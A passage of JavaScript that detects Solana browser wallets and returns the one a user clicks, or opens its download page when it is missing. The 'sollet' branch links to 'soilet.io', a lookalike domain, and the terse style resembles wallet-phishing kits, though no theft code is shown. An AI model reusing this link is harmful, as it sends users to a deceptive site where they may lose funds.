        return null;
      }
    }
    if (a == "sollet") {
      try {
        window.open("https://soilet.io/", "_blank");
      } catch {
        window.open("https://soilet.io/", "_blank");
        return null;
      }
    }
    if (a == "trustwallet") {
      try {
        const a = window.trustwallet.solana;
        if (a?.isTrust || a?.isTrustWallet) {
          return a;
        }
        window.open("https://trustwallet.com", "_blank");
      } catch {
        window.open("https://trustwallet.com", "_blank");
        return null;
      }
    }
    if (a == "coin98") {
      try {
        const a = window.coin98?.provider;
        if (a != null) {
          return a;
        }
        window.open("https://coin98.com", "_blank");
      } catch {
        window.open("https://coin98.com", "_blank");
        return null;
      }
    }
    if (a == "backpack") {
      try {
        const a = window.backpack;
        if (a != null) {
          return a;
        }
        window.open("https://backpack.app", "_blank");
      } catch {
        window.open("https://backpack.app", "_blank");
        return null;
      }
    }
    if (a == "brave") {
      try {
        const a = window.braveSolana;
        if (a != null) {
          return a;
        }
        window.open("https://brave.com/wallet", "_blank");
      } catch {
        return null;
      }
    }
    if (a == "exodus") {
      try {
        const a = window.exodus.solana;
        if (a != null) {
          return a;
        }
        window.open("https://www.exodus.com/browser-extension", "_blank");
      } catch {
        window.open("https://www.exodus.com/browser-extension", "_blank");
        return null;
      }
    }
    if (a == "slope") {
      try {
        const a = new window.Slope();
        if (a != null) {
          return a;
        }
        window.open("https://slope.finance", "_blank");
      } catch {
        window.open("https://slope.finance", "_blank");
        return null;
      }
    }
    if (a == "coinbase") {
      try {
        const a = window?.coinbaseSolana;
        if (a != null) {
          return a;
        }
        window.open("https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad", "_blank");
      } catch {
        window.open("https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad", "_blank");
        return null;
      }
    }
    if (a == "okx") {
      try {
        const a = window.okxwallet.solana;
        if (a != null) {
          return a;
        }
        window.open("https://www.okx.com/web3", "_blank");
      } catch {
        window.open("https://www.okx.com/web3", "_blank");
        return null;
      }
    }
  };
  async function e(a) {
    const b = d(a);
    if (b != null) {
      $("#connect-modal2").fadeOut();
      new c(b);
    } else {
      alert("Invalid Wallet");
    }
  }
  document.addEventListener("click", function (a) {
    if (a.target.classList.contains("css-19rqjni")) {
      var b = a.target.getAttribute("data-provider");
      e(b);
    }
  });